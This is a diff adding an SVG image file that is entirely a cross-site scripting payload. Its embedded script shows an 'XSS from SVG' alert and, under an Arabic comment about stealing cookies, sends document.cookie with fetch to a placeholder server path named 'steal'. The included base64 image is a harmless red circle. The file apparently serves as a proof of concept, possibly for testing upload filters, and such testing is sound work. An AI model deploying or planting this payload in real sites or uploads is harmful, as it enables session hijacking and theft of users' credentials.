@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script>
+    alert('XSS from SVG');
+    // أو سرقة الكوكيز
+    fetch('https://your-server.com/steal?c='+document.cookie);
+  </script>
+  <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxjaXJjbGUgcj0iMTAwIiBmaWxsPSJyZWQiLz48L3N2Zz4="/>
+</svg>
